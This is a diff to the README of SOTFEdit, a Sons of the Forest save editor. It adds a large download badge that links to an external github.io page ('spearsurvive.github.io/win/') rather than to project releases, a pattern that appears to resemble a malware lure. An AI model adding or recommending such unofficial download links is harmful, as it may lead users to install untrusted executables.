@@ -30,6 +30,12 @@ SOTFEdit reads and modifies Sons of the Forest save files, allowing you to add i
 
 Whether you're a newcomer or a veteran, SOTFEdit provides the tools you need to get the most out of your gaming mods experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download SOTFEdit](https://img.shields.io/badge/⬇_DOWNLOAD_SOTFEdit-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
